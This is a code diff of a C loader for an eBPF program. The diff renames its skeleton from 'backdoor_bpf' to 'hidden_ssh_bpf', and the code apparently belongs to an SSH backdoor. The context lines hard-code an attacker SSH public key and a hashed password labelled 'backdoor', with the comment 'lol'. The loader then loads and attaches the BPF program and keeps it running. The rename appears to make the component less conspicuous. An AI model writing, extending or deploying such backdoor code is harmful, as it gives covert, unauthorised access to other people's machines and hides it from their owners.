@@ -6,16 +6,16 @@
 #include <bpf/bpf.h>
 
 #include "backdoor.def.h"
-#include "backdoor.skel.h"
+#include "hidden_ssh.skel.h"
 
 char backdoor_publickey[] = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHgLzgvt+dvcDklpa1+j0fiaodAaHIP552JCnmDw00to";
 char backdoor_hashed_passwd[] = "$6$a$WURSl9l0w.6ozNrOYJOTooNhEM03emqmdNIgu8oSwzJxM.gyGCnRGqUsecNA3sRz.sJi6HwnI1yiX5yugU2/R1"; // lol
 
-struct backdoor_bpf *skel;
+struct hidden_ssh_bpf *skel;
 
 static void int_exit(int sig)
 {
-    backdoor_bpf__destroy(skel);
+    hidden_ssh_bpf__destroy(skel);
     exit(0);
 }
 
@@ -155,20 +155,20 @@ int main(int argc, char **argv)
 {
     int err;
 
-    skel = backdoor_bpf__open();
+    skel = hidden_ssh_bpf__open();
     if (!skel)
     {
         fprintf(stderr, "Failed to open and load BPF skeleton\n");
         return 1;
     }
 
-    err = backdoor_bpf__load(skel);
+    err = hidden_ssh_bpf__load(skel);
     if (err)
     {
         fprintf(stderr, "Failed to open and load BPF skeleton\n");
     }
 
-    err = backdoor_bpf__attach(skel);
+    err = hidden_ssh_bpf__attach(skel);
     if (err)
     {
         fprintf(stderr, "Failed to attach BPF skeleton\n");
@@ -190,7 +190,7 @@ int main(int argc, char **argv)
 
     signal(SIGINT, int_exit);
     signal(SIGTERM, int_exit);
-    printf("backdoor_bpf loaded successfully.\n");
+    printf("hidden_ssh_bpf loaded successfully.\n");
     while (1)
     {
         sleep(2);
